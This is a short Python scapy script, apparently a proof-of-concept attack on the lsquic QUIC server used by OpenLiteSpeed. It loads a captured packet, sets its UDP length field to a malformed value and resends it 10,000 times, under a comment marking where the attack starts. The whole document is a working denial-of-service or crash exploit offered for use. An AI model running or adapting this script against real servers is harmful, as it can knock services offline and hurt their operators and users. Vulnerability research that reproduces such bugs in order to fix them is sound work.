# Server : lsquic Openlightspeed
# Link : https://www.litespeedtech.com/

from scapy.all import *

packetCollection = rdpcap("packet.pcapng")
packet = packetCollection[0]

# Changes applied

packet[UDP].len = 50    # Reduce header length of UDP Layer

packet.show()

# Attack starts

cnt=1

while cnt <= 10000:
    sendp(packet)
    cnt = cnt + 1
